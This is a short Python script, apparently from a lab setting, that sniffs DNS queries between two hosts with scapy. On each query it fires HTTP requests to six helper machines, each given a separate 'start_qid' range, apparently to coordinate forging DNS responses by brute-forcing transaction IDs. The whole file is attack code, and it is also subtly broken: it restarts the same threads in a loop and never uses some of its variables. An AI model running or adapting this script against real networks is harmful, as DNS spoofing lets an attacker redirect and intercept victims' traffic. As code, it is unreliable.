import requests
from scapy.all import *
import threading

src_ip="192.168.0.100"
dst_ip="192.168.0.200"
mal_ip="192.168.0.151"

URL = 'http://192.168.1.160:8888'

if __name__ == "__main__":
	print("[*] Program is sniffing packets")
	
	t0 = threading.Thread(target=requests.get, args=('http://192.168.0.160:8888?start_qid=1',))
	t1 = threading.Thread(target=requests.get, args=('http://192.168.0.161:8888?start_qid=10000',))
	t2 = threading.Thread(target=requests.get, args=('http://192.168.0.162:8888?start_qid=20000',))
	t3 = threading.Thread(target=requests.get, args=('http://192.168.0.163:8888?start_qid=30000',))
	t4 = threading.Thread(target=requests.get, args=('http://192.168.0.164:8888?start_qid=40000',))
	t5 = threading.Thread(target=requests.get, args=('http://192.168.0.165:8888?start_qid=50000',))
	
	while 1:
		sniffed_packet=sniff(iface="eth0", filter="src host " + dst_ip + " and dst host " + src_ip + " and dst port 53", count=1)
		if sniffed_packet[0].haslayer(DNS):
			print("[*] DNS Packet has been sniffed. Malicious packet will be forged and sent")
			t0.start()
			t1.start()
			t2.start()
			t3.start()
			t4.start()
			t5.start()

